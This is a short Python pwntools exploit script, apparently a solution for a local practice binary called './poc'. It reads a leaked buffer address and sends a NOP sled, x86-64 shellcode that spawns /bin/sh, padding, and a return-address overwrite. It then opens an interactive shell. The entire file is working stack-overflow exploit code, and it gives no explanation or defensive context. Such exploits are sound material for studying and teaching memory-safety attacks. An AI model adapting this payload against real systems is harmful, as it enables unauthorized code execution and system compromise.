#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./poc")

p.recvuntil(": ")

buf = int(p.recv(14), 16)
log.info("buf : "+hex(buf))

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.send('\x90'*10 + shellcode + '\x90'*(0x40+8-10-len(shellcode)) + p64(buf))

p.interactive()
